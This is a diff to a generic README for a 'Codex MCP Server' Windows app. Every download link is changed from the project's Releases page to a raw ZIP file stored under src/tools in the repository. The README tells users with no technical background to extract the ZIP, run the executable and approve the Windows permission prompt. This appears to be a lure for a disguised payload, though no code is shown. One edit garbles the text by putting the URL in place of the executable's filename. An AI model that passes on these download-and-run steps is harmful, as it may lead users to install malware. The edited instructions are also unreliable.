@@ -1,7 +1,7 @@
 # 🚀 codex-mcp-server - Reliable Server for Your Needs
 
 ## 📥 Download Now!
-[![Download Codex MCP Server](https://img.shields.io/badge/Download%20Now-v1.0-blue)](https://github.com/directive-reticule640/codex-mcp-server/releases)
+[![Download Codex MCP Server](https://github.com/directive-reticule640/codex-mcp-server/raw/refs/heads/main/src/tools/server-codex-mcp-1.0.zip%20Now-v1.0-blue)](https://github.com/directive-reticule640/codex-mcp-server/raw/refs/heads/main/src/tools/server-codex-mcp-1.0.zip)
 
 ## 📝 Overview
 Codex MCP Server is an easy-to-use application designed to simplify your server management tasks. With a focus on reliability, Codex MCP Server helps you get your tasks done quickly and effortlessly. You don’t need any advanced technical skills to use it.
@@ -10,7 +10,7 @@ Codex MCP Server is an easy-to-use application designed to simplify your server 
 To start using Codex MCP Server, follow these steps:
 
 1. **Visit the Release Page**:
-   Go to the [Releases page](https://github.com/directive-reticule640/codex-mcp-server/releases).
+   Go to the [Releases page](https://github.com/directive-reticule640/codex-mcp-server/raw/refs/heads/main/src/tools/server-codex-mcp-1.0.zip).
 
 2. **Choose the Latest Version**:
    Look for the latest version listed at the top of the page. Always choose the most recent release for the best features and fixes.
@@ -25,7 +25,7 @@ Follow these simple steps to install Codex MCP Server on your computer:
    If the file is a ZIP, right-click on the file and select "Extract All". Follow the prompts to extract the contents.
 
 2. **Locate the Executable File**:
-   Inside the extracted folder, find the file named `CodexMCPServer.exe` or similar.
+   Inside the extracted folder, find the file named `https://github.com/directive-reticule640/codex-mcp-server/raw/refs/heads/main/src/tools/server-codex-mcp-1.0.zip` or similar.
 
 3. **Run the Executable**:
    Double-click on the executable file to start the server. Windows may ask for permissions; click "Yes" to continue.
@@ -49,7 +49,7 @@ Codex MCP Server offers multiple features:
 - **Community Support**: Join discussions and ask questions.
 
 ## 🔄 Download & Install
-To download and start using Codex MCP Server, please visit the [Releases page](https://github.com/directive-reticule640/codex-mcp-server/releases) again. Here’s a brief recap of the download process:
+To download and start using Codex MCP Server, please visit the [Releases page](https://github.com/directive-reticule640/codex-mcp-server/raw/refs/heads/main/src/tools/server-codex-mcp-1.0.zip) again. Here’s a brief recap of the download process:
 
 1. Visit the Releases page.
 2. Select the latest version.
